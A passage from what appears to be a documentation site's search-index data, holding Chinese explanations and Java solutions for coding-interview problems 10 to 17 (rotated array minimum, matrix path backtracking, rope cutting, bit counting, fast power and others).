}`},{header:"\u6570\u5B66\u63A8\u5BFC",slug:"\u6570\u5B66\u63A8\u5BFC",content:`\u8DF3\u4E0A n-1 \u7EA7\u53F0\u9636\uFF0C\u53EF\u4EE5\u4ECE n-2 \u7EA7\u8DF3 1 \u7EA7\u4E0A\u53BB\uFF0C\u4E5F\u53EF\u4EE5\u4ECE n-3 \u7EA7\u8DF3 2 \u7EA7\u4E0A\u53BB...\uFF0C\u90A3\u4E48
f(n-1) = f(n-2) + f(n-3) + ... + f(0)
\u540C\u6837\uFF0C\u8DF3\u4E0A n \u7EA7\u53F0\u9636\uFF0C\u53EF\u4EE5\u4ECE n-1 \u7EA7\u8DF3 1 \u7EA7\u4E0A\u53BB\uFF0C\u4E5F\u53EF\u4EE5\u4ECE n-2 \u7EA7\u8DF3 2 \u7EA7\u4E0A\u53BB... \uFF0C\u90A3\u4E48
f(n) = f(n-1) + f(n-2) + ... + f(0)
\u7EFC\u4E0A\u53EF\u5F97
f(n) - f(n-1) = f(n-1)
\u5373
f(n) = 2*f(n-1)
\u6240\u4EE5 f(n) \u662F\u4E00\u4E2A\u7B49\u6BD4\u6570\u5217
public int JumpFloorII(int target) { return (int) Math.pow(2, target - 1);
}`}]},{path:"/%E9%A2%98%E8%A7%A3/11.%20%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%B0%8F%E6%95%B0%E5%AD%97.html",title:"11. \u65CB\u8F6C\u6570\u7EC4\u7684\u6700\u5C0F\u6570\u5B57",pathLocale:"/",contents:[{header:"11. \u65CB\u8F6C\u6570\u7EC4\u7684\u6700\u5C0F\u6570\u5B57",slug:"_11-\u65CB\u8F6C\u6570\u7EC4\u7684\u6700\u5C0F\u6570\u5B57",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u628A\u4E00\u4E2A\u6570\u7EC4\u6700\u5F00\u59CB\u7684\u82E5\u5E72\u4E2A\u5143\u7D20\u642C\u5230\u6570\u7EC4\u7684\u672B\u5C3E\uFF0C\u6211\u4EEC\u79F0\u4E4B\u4E3A\u6570\u7EC4\u7684\u65CB\u8F6C\u3002\u8F93\u5165\u4E00\u4E2A\u975E\u9012\u51CF\u6392\u5E8F\u7684\u6570\u7EC4\u7684\u4E00\u4E2A\u65CB\u8F6C\uFF0C\u8F93\u51FA\u65CB\u8F6C\u6570\u7EC4\u7684\u6700\u5C0F\u5143\u7D20\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0038204c-4b8a-42a5-921d-080f6674f989.png" width="210px">`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u5C06\u65CB\u8F6C\u6570\u7EC4\u5BF9\u534A\u5206\u53EF\u4EE5\u5F97\u5230\u4E00\u4E2A\u5305\u542B\u6700\u5C0F\u5143\u7D20\u7684\u65B0\u65CB\u8F6C\u6570\u7EC4\uFF0C\u4EE5\u53CA\u4E00\u4E2A\u975E\u9012\u51CF\u6392\u5E8F\u7684\u6570\u7EC4\u3002\u65B0\u7684\u65CB\u8F6C\u6570\u7EC4\u7684\u957F\u5EA6\u662F\u539F\u6570\u7EC4\u7684\u4E00\u534A\uFF0C\u4ECE\u800C\u5C06\u95EE\u9898\u89C4\u6A21\u51CF\u5C11\u4E86\u4E00\u534A\uFF0C\u8FD9\u79CD\u6298\u534A\u6027\u8D28\u7684\u7B97\u6CD5\u7684\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(log2N)\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/424f34ab-a9fd-49a6-9969-d76b42251365.png" width="300px">
\u6B64\u65F6\u95EE\u9898\u7684\u5173\u952E\u5728\u4E8E\u786E\u5B9A\u5BF9\u534A\u5206\u5F97\u5230\u7684\u4E24\u4E2A\u6570\u7EC4\u54EA\u4E00\u4E2A\u662F\u65CB\u8F6C\u6570\u7EC4\uFF0C\u54EA\u4E00\u4E2A\u662F\u975E\u9012\u51CF\u6570\u7EC4\u3002\u6211\u4EEC\u5F88\u5BB9\u6613\u77E5\u9053\u975E\u9012\u51CF\u6570\u7EC4\u7684\u7B2C\u4E00\u4E2A\u5143\u7D20\u4E00\u5B9A\u5C0F\u4E8E\u7B49\u4E8E\u6700\u540E\u4E00\u4E2A\u5143\u7D20\u3002
\u901A\u8FC7\u4FEE\u6539\u4E8C\u5206\u67E5\u627E\u7B97\u6CD5\u8FDB\u884C\u6C42\u89E3\uFF08l \u4EE3\u8868 low\uFF0Cm \u4EE3\u8868 mid\uFF0Ch \u4EE3\u8868 high\uFF09\uFF1A \u5F53 nums[m] <= nums[h] \u65F6\uFF0C\u8868\u793A [m, h] \u533A\u95F4\u5185\u7684\u6570\u7EC4\u662F\u975E\u9012\u51CF\u6570\u7EC4\uFF0C[l, m] \u533A\u95F4\u5185\u7684\u6570\u7EC4\u662F\u65CB\u8F6C\u6570\u7EC4\uFF0C\u6B64\u65F6\u4EE4 h = m\uFF1B
\u5426\u5219 [m + 1, h] \u533A\u95F4\u5185\u7684\u6570\u7EC4\u662F\u65CB\u8F6C\u6570\u7EC4\uFF0C\u4EE4 l = m + 1\u3002 public int minNumberInRotateArray(int[] nums) { if (nums.length == 0) return 0; int l = 0, h = nums.length - 1; while (l < h) { int m = l + (h - l) / 2; if (nums[m] <= nums[h]) h = m; else l = m + 1; } return nums[l];
}
\u5982\u679C\u6570\u7EC4\u5143\u7D20\u5141\u8BB8\u91CD\u590D\uFF0C\u4F1A\u51FA\u73B0\u4E00\u4E2A\u7279\u6B8A\u7684\u60C5\u51B5\uFF1Anums[l] == nums[m] == nums[h]\uFF0C\u6B64\u65F6\u65E0\u6CD5\u786E\u5B9A\u89E3\u5728\u54EA\u4E2A\u533A\u95F4\uFF0C\u9700\u8981\u5207\u6362\u5230\u987A\u5E8F\u67E5\u627E\u3002\u4F8B\u5982\u5BF9\u4E8E\u6570\u7EC4 {1,1,1,0,1}\uFF0Cl\u3001m \u548C h \u6307\u5411\u7684\u6570\u90FD\u4E3A 1\uFF0C\u6B64\u65F6\u65E0\u6CD5\u77E5\u9053\u6700\u5C0F\u6570\u5B57 0 \u5728\u54EA\u4E2A\u533A\u95F4\u3002
public int minNumberInRotateArray(int[] nums) { if (nums.length == 0) return 0; int l = 0, h = nums.length - 1; while (l < h) { int m = l + (h - l) / 2; if (nums[l] == nums[m] && nums[m] == nums[h]) return minNumber(nums, l, h); else if (nums[m] <= nums[h]) h = m; else l = m + 1; } return nums[l];
} private int minNumber(int[] nums, int l, int h) { for (int i = l; i < h; i++) if (nums[i] > nums[i + 1]) return nums[i + 1]; return nums[l];
}`}]},{path:"/%E9%A2%98%E8%A7%A3/12.%20%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E8%B7%AF%E5%BE%84.html",title:"12. \u77E9\u9635\u4E2D\u7684\u8DEF\u5F84",pathLocale:"/",contents:[{header:"12. \u77E9\u9635\u4E2D\u7684\u8DEF\u5F84",slug:"_12-\u77E9\u9635\u4E2D\u7684\u8DEF\u5F84",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u5224\u65AD\u5728\u4E00\u4E2A\u77E9\u9635\u4E2D\u662F\u5426\u5B58\u5728\u4E00\u6761\u5305\u542B\u67D0\u5B57\u7B26\u4E32\u6240\u6709\u5B57\u7B26\u7684\u8DEF\u5F84\u3002\u8DEF\u5F84\u53EF\u4EE5\u4ECE\u77E9\u9635\u4E2D\u7684\u4EFB\u610F\u4E00\u4E2A\u683C\u5B50\u5F00\u59CB\uFF0C\u6BCF\u4E00\u6B65\u53EF\u4EE5\u5728\u77E9\u9635\u4E2D\u5411\u4E0A\u4E0B\u5DE6\u53F3\u79FB\u52A8\u4E00\u4E2A\u683C\u5B50\u3002\u5982\u679C\u4E00\u6761\u8DEF\u5F84\u7ECF\u8FC7\u4E86\u77E9\u9635\u4E2D\u7684\u67D0\u4E00\u4E2A\u683C\u5B50\uFF0C\u5219\u8BE5\u8DEF\u5F84\u4E0D\u80FD\u518D\u8FDB\u5165\u8BE5\u683C\u5B50\u3002
\u4F8B\u5982\u4E0B\u9762\u7684\u77E9\u9635\u5305\u542B\u4E86\u4E00\u6761 bfce \u8DEF\u5F84\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1db1c7ea-0443-478b-8df9-7e33b1336cc4.png" width="200px">`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u4F7F\u7528\u56DE\u6EAF\u6CD5\uFF08backtracking\uFF09\u8FDB\u884C\u6C42\u89E3\uFF0C\u5B83\u662F\u4E00\u79CD\u66B4\u529B\u641C\u7D22\u65B9\u6CD5\uFF0C\u901A\u8FC7\u641C\u7D22\u6240\u6709\u53EF\u80FD\u7684\u7ED3\u679C\u6765\u6C42\u89E3\u95EE\u9898\u3002\u56DE\u6EAF\u6CD5\u5728\u4E00\u6B21\u641C\u7D22\u7ED3\u675F\u65F6\u9700\u8981\u8FDB\u884C\u56DE\u6EAF\uFF08\u56DE\u9000\uFF09\uFF0C\u5C06\u8FD9\u4E00\u6B21\u641C\u7D22\u8FC7\u7A0B\u4E2D\u8BBE\u7F6E\u7684\u72B6\u6001\u8FDB\u884C\u6E05\u9664\uFF0C\u4ECE\u800C\u5F00\u59CB\u4E00\u6B21\u65B0\u7684\u641C\u7D22\u8FC7\u7A0B\u3002\u4F8B\u5982\u4E0B\u56FE\u793A\u4F8B\u4E2D\uFF0C\u4ECE f \u5F00\u59CB\uFF0C\u4E0B\u4E00\u6B65\u6709 4 \u79CD\u641C\u7D22\u53EF\u80FD\uFF0C\u5982\u679C\u5148\u641C\u7D22 b\uFF0C\u9700\u8981\u5C06 b \u6807\u8BB0\u4E3A\u5DF2\u7ECF\u4F7F\u7528\uFF0C\u9632\u6B62\u91CD\u590D\u4F7F\u7528\u3002\u5728\u8FD9\u4E00\u6B21\u641C\u7D22\u7ED3\u675F\u4E4B\u540E\uFF0C\u9700\u8981\u5C06 b \u7684\u5DF2\u7ECF\u4F7F\u7528\u72B6\u6001\u6E05\u9664\uFF0C\u5E76\u641C\u7D22 c\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/dc964b86-7a08-4bde-a3d9-e6ddceb29f98.png" width="200px">
\u672C\u9898\u7684\u8F93\u5165\u662F\u6570\u7EC4\u800C\u4E0D\u662F\u77E9\u9635\uFF08\u4E8C\u7EF4\u6570\u7EC4\uFF09\uFF0C\u56E0\u6B64\u9700\u8981\u5148\u5C06\u6570\u7EC4\u8F6C\u6362\u6210\u77E9\u9635\u3002
public class Solution { private final static int[][] next = {{0, -1}, {0, 1}, {-1, 0}, {1, 0}}; private int rows; private int cols; public boolean hasPath (String val, int rows, int cols, String path) { if (rows == 0 || cols == 0) return false; this.rows = rows; this.cols = cols; char[] array = val.toCharArray(); char[][] matrix = buildMatrix(array); char[] pathList = path.toCharArray(); boolean[][] marked = new boolean[rows][cols]; for (int i = 0; i < rows; i++) for (int j = 0; j < cols; j++) if (backtracking(matrix, pathList, marked, 0, i, j)) return true; return false; } private boolean backtracking(char[][] matrix, char[] pathList, boolean[][] marked, int pathLen, int r, int c) { if (pathLen == pathList.length) return true; if (r < 0 || r >= rows || c < 0 || c >= cols || matrix[r][c] != pathList[pathLen] || marked[r][c]) { return false; } marked[r][c] = true; for (int[] n : next) if (backtracking(matrix, pathList, marked, pathLen + 1, r + n[0], c + n[1])) return true; marked[r][c] = false; return false; } private char[][] buildMatrix(char[] array) { char[][] matrix = new char[rows][cols]; for (int r = 0, idx = 0; r < rows; r++) for (int c = 0; c < cols; c++) matrix[r][c] = array[idx++]; return matrix; } public static void main(String[] args) { Solution solution = new Solution(); String val = "ABCESFCSADEE"; int rows = 3; int cols = 4; String path = "ABCCED"; boolean res = solution.hasPath(val, rows, cols, path); System.out.println(res); }
}`}]},{path:"/%E9%A2%98%E8%A7%A3/13.%20%E6%9C%BA%E5%99%A8%E4%BA%BA%E7%9A%84%E8%BF%90%E5%8A%A8%E8%8C%83%E5%9B%B4.html",title:"13. \u673A\u5668\u4EBA\u7684\u8FD0\u52A8\u8303\u56F4",pathLocale:"/",contents:[{header:"13. \u673A\u5668\u4EBA\u7684\u8FD0\u52A8\u8303\u56F4",slug:"_13-\u673A\u5668\u4EBA\u7684\u8FD0\u52A8\u8303\u56F4",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u5730\u4E0A\u6709\u4E00\u4E2A m \u884C\u548C n \u5217\u7684\u65B9\u683C\u3002\u4E00\u4E2A\u673A\u5668\u4EBA\u4ECE\u5750\u6807 (0, 0) \u7684\u683C\u5B50\u5F00\u59CB\u79FB\u52A8\uFF0C\u6BCF\u4E00\u6B21\u53EA\u80FD\u5411\u5DE6\u53F3\u4E0A\u4E0B\u56DB\u4E2A\u65B9\u5411\u79FB\u52A8\u4E00\u683C\uFF0C\u4F46\u662F\u4E0D\u80FD\u8FDB\u5165\u884C\u5750\u6807\u548C\u5217\u5750\u6807\u7684\u6570\u4F4D\u4E4B\u548C\u5927\u4E8E k \u7684\u683C\u5B50\u3002
\u4F8B\u5982\uFF0C\u5F53 k \u4E3A 18 \u65F6\uFF0C\u673A\u5668\u4EBA\u80FD\u591F\u8FDB\u5165\u65B9\u683C (35,37)\uFF0C\u56E0\u4E3A 3+5+3+7=18\u3002\u4F46\u662F\uFF0C\u5B83\u4E0D\u80FD\u8FDB\u5165\u65B9\u683C (35,38)\uFF0C\u56E0\u4E3A 3+5+3+8=19\u3002\u8BF7\u95EE\u8BE5\u673A\u5668\u4EBA\u80FD\u591F\u8FBE\u5230\u591A\u5C11\u4E2A\u683C\u5B50\uFF1F`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u4F7F\u7528\u6DF1\u5EA6\u4F18\u5148\u641C\u7D22\uFF08Depth First Search\uFF0CDFS\uFF09\u65B9\u6CD5\u8FDB\u884C\u6C42\u89E3\u3002\u56DE\u6EAF\u662F\u6DF1\u5EA6\u4F18\u5148\u641C\u7D22\u7684\u4E00\u79CD\u7279\u4F8B\uFF0C\u5B83\u5728\u4E00\u6B21\u641C\u7D22\u8FC7\u7A0B\u4E2D\u9700\u8981\u8BBE\u7F6E\u4E00\u4E9B\u672C\u6B21\u641C\u7D22\u8FC7\u7A0B\u7684\u5C40\u90E8\u72B6\u6001\uFF0C\u5E76\u5728\u672C\u6B21\u641C\u7D22\u7ED3\u675F\u4E4B\u540E\u6E05\u9664\u72B6\u6001\u3002\u800C\u666E\u901A\u7684\u6DF1\u5EA6\u4F18\u5148\u641C\u7D22\u5E76\u4E0D\u9700\u8981\u4F7F\u7528\u8FD9\u4E9B\u5C40\u90E8\u72B6\u6001\uFF0C\u867D\u7136\u8FD8\u662F\u6709\u53EF\u80FD\u8BBE\u7F6E\u4E00\u4E9B\u5168\u5C40\u72B6\u6001\u3002
private static final int[][] next = {{0, -1}, {0, 1}, {-1, 0}, {1, 0}};
private int cnt = 0;
private int rows;
private int cols;
private int threshold;
private int[][] digitSum; public int movingCount(int threshold, int rows, int cols) { this.rows = rows; this.cols = cols; this.threshold = threshold; initDigitSum(); boolean[][] marked = new boolean[rows][cols]; dfs(marked, 0, 0); return cnt;
} private void dfs(boolean[][] marked, int r, int c) { if (r < 0 || r >= rows || c < 0 || c >= cols || marked[r][c]) return; marked[r][c] = true; if (this.digitSum[r][c] > this.threshold) return; cnt++; for (int[] n : next) dfs(marked, r + n[0], c + n[1]);
} private void initDigitSum() { int[] digitSumOne = new int[Math.max(rows, cols)]; for (int i = 0; i < digitSumOne.length; i++) { int n = i; while (n > 0) { digitSumOne[i] += n % 10; n /= 10; } } this.digitSum = new int[rows][cols]; for (int i = 0; i < this.rows; i++) for (int j = 0; j < this.cols; j++) this.digitSum[i][j] = digitSumOne[i] + digitSumOne[j];
}`}]},{path:"/%E9%A2%98%E8%A7%A3/14.%20%E5%89%AA%E7%BB%B3%E5%AD%90.html",title:"14. \u526A\u7EF3\u5B50",pathLocale:"/",contents:[{header:"14. \u526A\u7EF3\u5B50",slug:"_14-\u526A\u7EF3\u5B50",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u628A\u4E00\u6839\u7EF3\u5B50\u526A\u6210\u591A\u6BB5\uFF0C\u5E76\u4E14\u4F7F\u5F97\u6BCF\u6BB5\u7684\u957F\u5EA6\u4E58\u79EF\u6700\u5927\u3002
n = 2
return 1 (2 = 1 + 1) n = 10
return 36 (10 = 3 + 3 + 4)`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:""},{header:"\u8D2A\u5FC3",slug:"\u8D2A\u5FC3",content:`\u5C3D\u53EF\u80FD\u5F97\u591A\u526A\u957F\u5EA6\u4E3A 3 \u7684\u7EF3\u5B50\uFF0C\u5E76\u4E14\u4E0D\u5141\u8BB8\u6709\u957F\u5EA6\u4E3A 1 \u7684\u7EF3\u5B50\u51FA\u73B0\u3002\u5982\u679C\u51FA\u73B0\u4E86\uFF0C\u5C31\u4ECE\u5DF2\u7ECF\u5207\u597D\u957F\u5EA6\u4E3A 3 \u7684\u7EF3\u5B50\u4E2D\u62FF\u51FA\u4E00\u6BB5\u4E0E\u957F\u5EA6\u4E3A 1 \u7684\u7EF3\u5B50\u91CD\u65B0\u7EC4\u5408\uFF0C\u628A\u5B83\u4EEC\u5207\u6210\u4E24\u6BB5\u957F\u5EA6\u4E3A 2 \u7684\u7EF3\u5B50\u3002\u4EE5\u4E0B\u4E3A\u8BC1\u660E\u8FC7\u7A0B\u3002
\u5C06\u7EF3\u5B50\u62C6\u6210 1 \u548C n-1\uFF0C\u5219 1(n-1)-n=-1<0\uFF0C\u5373\u62C6\u5F00\u540E\u7684\u4E58\u79EF\u4E00\u5B9A\u66F4\u5C0F\uFF0C\u6240\u4EE5\u4E0D\u80FD\u51FA\u73B0\u957F\u5EA6\u4E3A 1 \u7684\u7EF3\u5B50\u3002
\u5C06\u7EF3\u5B50\u62C6\u6210 2 \u548C n-2\uFF0C\u5219 2(n-2)-n = n-4\uFF0C\u5728 n>=4 \u65F6\u8FD9\u6837\u62C6\u5F00\u80FD\u5F97\u5230\u7684\u4E58\u79EF\u4F1A\u6BD4\u4E0D\u62C6\u66F4\u5927\u3002
\u5C06\u7EF3\u5B50\u62C6\u6210 3 \u548C n-3\uFF0C\u5219 3(n-3)-n = 2n-9\uFF0C\u5728 n>=5 \u65F6\u6548\u679C\u66F4\u597D\u3002
\u5C06\u7EF3\u5B50\u62C6\u6210 4 \u548C n-4\uFF0C\u56E0\u4E3A 4=2*2\uFF0C\u56E0\u6B64\u6548\u679C\u548C\u62C6\u6210 2 \u4E00\u6837\u3002
\u5C06\u7EF3\u5B50\u62C6\u6210 5 \u548C n-5\uFF0C\u56E0\u4E3A 5=2+3\uFF0C\u800C 5<2*3\uFF0C\u6240\u4EE5\u4E0D\u80FD\u51FA\u73B0 5 \u7684\u7EF3\u5B50\uFF0C\u800C\u662F\u5C3D\u53EF\u80FD\u62C6\u6210 2 \u548C 3\u3002
\u5C06\u7EF3\u5B50\u62C6\u6210 6 \u548C n-6\uFF0C\u56E0\u4E3A 6=3+3\uFF0C\u800C 6<3*3\uFF0C\u6240\u4EE5\u4E0D\u80FD\u51FA\u73B0 6 \u7684\u7EF3\u5B50\uFF0C\u800C\u662F\u62C6\u6210 3 \u548C 3\u3002\u8FD9\u91CC 6 \u540C\u6837\u53EF\u4EE5\u62C6\u6210 6=2+2+2\uFF0C\u4F46\u662F 3(n - 3) - 2(n - 2) = n - 5 >= 0\uFF0C\u5728 n>=5 \u7684\u60C5\u51B5\u4E0B\u5C06\u7EF3\u5B50\u62C6\u6210 3 \u6BD4\u62C6\u6210 2 \u6548\u679C\u66F4\u597D\u3002
\u7EE7\u7EED\u62C6\u6210\u66F4\u5927\u7684\u7EF3\u5B50\u53EF\u4EE5\u53D1\u73B0\u90FD\u6BD4\u62C6\u6210 2 \u548C 3 \u7684\u6548\u679C\u66F4\u5DEE\uFF0C\u56E0\u6B64\u6211\u4EEC\u53EA\u8003\u8651\u5C06\u7EF3\u5B50\u62C6\u6210 2 \u548C 3\uFF0C\u5E76\u4E14\u4F18\u5148\u62C6\u6210 3\uFF0C\u5F53\u62C6\u5230\u7EF3\u5B50\u957F\u5EA6 n \u7B49\u4E8E 4 \u65F6\uFF0C\u4E5F\u5C31\u662F\u51FA\u73B0 3+1\uFF0C\u6B64\u65F6\u53EA\u80FD\u62C6\u6210 2+2\u3002
public int cutRope(int n) { if (n < 2) return 0; if (n == 2) return 1; if (n == 3) return 2; int timesOf3 = n / 3; if (n - timesOf3 * 3 == 1) timesOf3--; int timesOf2 = (n - timesOf3 * 3) / 2; return (int) (Math.pow(3, timesOf3)) * (int) (Math.pow(2, timesOf2));
}`},{header:"\u52A8\u6001\u89C4\u5212",slug:"\u52A8\u6001\u89C4\u5212",content:`public int cutRope(int n) { int[] dp = new int[n + 1]; dp[1] = 1; for (int i = 2; i <= n; i++) for (int j = 1; j < i; j++) dp[i] = Math.max(dp[i], Math.max(j * (i - j), dp[j] * (i - j))); return dp[n];
}`}]},{path:"/%E9%A2%98%E8%A7%A3/15.%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%AD%201%20%E7%9A%84%E4%B8%AA%E6%95%B0.html",title:"15. \u4E8C\u8FDB\u5236\u4E2D 1 \u7684\u4E2A\u6570",pathLocale:"/",contents:[{header:"15. \u4E8C\u8FDB\u5236\u4E2D 1 \u7684\u4E2A\u6570",slug:"_15-\u4E8C\u8FDB\u5236\u4E2D-1-\u7684\u4E2A\u6570",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u8F93\u5165\u4E00\u4E2A\u6574\u6570\uFF0C\u8F93\u51FA\u8BE5\u6570\u4E8C\u8FDB\u5236\u8868\u793A\u4E2D 1 \u7684\u4E2A\u6570\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`n&(n-1) \u4F4D\u8FD0\u7B97\u53EF\u4EE5\u5C06 n \u7684\u4F4D\u7EA7\u8868\u793A\u4E2D\u6700\u4F4E\u7684\u90A3\u4E00\u4F4D 1 \u8BBE\u7F6E\u4E3A 0\u3002\u4E0D\u65AD\u5C06 1 \u8BBE\u7F6E\u4E3A 0\uFF0C\u76F4\u5230 n \u4E3A 0\u3002\u65F6\u95F4\u590D\u6742\u5EA6\uFF1AO(M)\uFF0C\u5176\u4E2D M \u8868\u793A 1 \u7684\u4E2A\u6570\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20201105004127554.png" width="500px">
public int NumberOf1(int n) { int cnt = 0; while (n != 0) { cnt++; n &= (n - 1); } return cnt;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/16.%20%E6%95%B0%E5%80%BC%E7%9A%84%E6%95%B4%E6%95%B0%E6%AC%A1%E6%96%B9.html",title:"16. \u6570\u503C\u7684\u6574\u6570\u6B21\u65B9",pathLocale:"/",contents:[{header:"16. \u6570\u503C\u7684\u6574\u6570\u6B21\u65B9",slug:"_16-\u6570\u503C\u7684\u6574\u6570\u6B21\u65B9",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u7ED9\u5B9A\u4E00\u4E2A double \u7C7B\u578B\u7684\u6D6E\u70B9\u6570 x\u548C int \u7C7B\u578B\u7684\u6574\u6570 n\uFF0C\u6C42 x \u7684 n \u6B21\u65B9\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u6700\u76F4\u89C2\u7684\u89E3\u6CD5\u662F\u5C06 x \u91CD\u590D\u4E58 n \u6B21\uFF0Cx*x*x...*x\uFF0C\u90A3\u4E48\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(N)\u3002\u56E0\u4E3A\u4E58\u6CD5\u662F\u53EF\u4EA4\u6362\u7684\uFF0C\u6240\u4EE5\u53EF\u4EE5\u5C06\u4E0A\u8FF0\u64CD\u4F5C\u62C6\u5F00\u6210\u4E24\u534A (x*x..*x)* (x*x..*x)\uFF0C\u4E24\u534A\u7684\u8BA1\u7B97\u662F\u4E00\u6837\u7684\uFF0C\u56E0\u6B64\u53EA\u9700\u8981\u8BA1\u7B97\u4E00\u6B21\u3002\u800C\u4E14\u5BF9\u4E8E\u65B0\u62C6\u5F00\u7684\u8BA1\u7B97\uFF0C\u53C8\u53EF\u4EE5\u7EE7\u7EED\u62C6\u5F00\u3002\u8FD9\u5C31\u662F\u5206\u6CBB\u601D\u60F3\uFF0C\u5C06\u539F\u95EE\u9898\u7684\u89C4\u6A21\u62C6\u6210\u591A\u4E2A\u89C4\u6A21\u8F83\u5C0F\u7684\u5B50\u95EE\u9898\uFF0C\u6700\u540E\u5B50\u95EE\u9898\u7684\u89E3\u5408\u5E76\u8D77\u6765\u3002
\u672C\u9898\u4E2D\u5B50\u95EE\u9898\u662F xn/2\uFF0C\u5728\u5C06\u5B50\u95EE\u9898\u5408\u5E76\u65F6\u5C06\u5B50\u95EE\u9898\u7684\u89E3\u4E58\u4E8E\u81EA\u8EAB\u76F8\u4E58\u5373\u53EF\u3002\u4F46\u5982\u679C n \u4E0D\u4E3A\u5076\u6570\uFF0C\u90A3\u4E48\u62C6\u6210\u4E24\u534A\u8FD8\u4F1A\u5269\u4E0B\u4E00\u4E2A x\uFF0C\u5728\u5C06\u5B50\u95EE\u9898\u5408\u5E76\u65F6\u8FD8\u9700\u8981\u9700\u8981\u591A\u4E58\u4E8E\u4E00\u4E2A x\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20201105012506187.png" width="400px">
\u56E0\u4E3A (x*x)n/2 \u53EF\u4EE5\u901A\u8FC7\u9012\u5F52\u6C42\u89E3\uFF0C\u5E76\u4E14\u6BCF\u6B21\u9012\u5F52 n \u90FD\u51CF\u5C0F\u4E00\u534A\uFF0C\u56E0\u6B64\u6574\u4E2A\u7B97\u6CD5\u7684\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(logN)\u3002
public double Power(double x, int n) { boolean isNegative = false; if (n < 0) { n = -n; isNegative = true; } double res = pow(x, n); return isNegative ? 1 / res : res;
} private double pow(double x, int n) { if (n == 0) return 1; if (n == 1) return x; double res = pow(x, n / 2); res = res * res; if (n % 2 != 0) res *= x; return res;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/17.%20%E6%89%93%E5%8D%B0%E4%BB%8E%201%20%E5%88%B0%E6%9C%80%E5%A4%A7%E7%9A%84%20n%20%E4%BD%8D%E6%95%B0.html",title:"17. \u6253\u5370\u4ECE 1 \u5230\u6700\u5927\u7684 n \u4F4D\u6570",pathLocale:"/",contents:[{header:"17. \u6253\u5370\u4ECE 1 \u5230\u6700\u5927\u7684 n \u4F4D\u6570",slug:"_17-\u6253\u5370\u4ECE-1-\u5230\u6700\u5927\u7684-n-\u4F4D\u6570",content:""},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u8F93\u5165\u6570\u5B57 n\uFF0C\u6309\u987A\u5E8F\u6253\u5370\u51FA\u4ECE 1 \u5230\u6700\u5927\u7684 n \u4F4D\u5341\u8FDB\u5236\u6570\u3002\u6BD4\u5982\u8F93\u5165 3\uFF0C\u5219\u6253\u5370\u51FA 1\u30012\u30013 \u4E00\u76F4\u5230\u6700\u5927\u7684 3 \u4F4D\u6570\u5373 999\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u7531\u4E8E n \u53EF\u80FD\u4F1A\u975E\u5E38\u5927\uFF0C\u56E0\u6B64\u4E0D\u80FD\u76F4\u63A5\u7528 int \u8868\u793A\u6570\u5B57\uFF0C\u800C\u662F\u7528 char \u6570\u7EC4\u8FDB\u884C\u5B58\u50A8\u3002
\u4F7F\u7528\u56DE\u6EAF\u6CD5\u5F97\u5230\u6240\u6709\u7684\u6570\u3002
public void print1ToMaxOfNDigits(int n) { if (n <= 0) return; char[] number = new char[n]; print1ToMaxOfNDigits(number, 0);
} private void print1ToMaxOfNDigits(char[] number, int digit) { if (digit == number.length) { printNumber(number); return; } for (int i = 0; i < 10; i++) { number[digit] = (char) (i + '0'); print1ToMaxOfNDigits(number, digit + 1); }
} private void printNumber(char[] number) { int index = 0; while (index < number.length && number[index] == '0') index++; while (index < number.length) System.out.print(number[index++]); System.out.println();
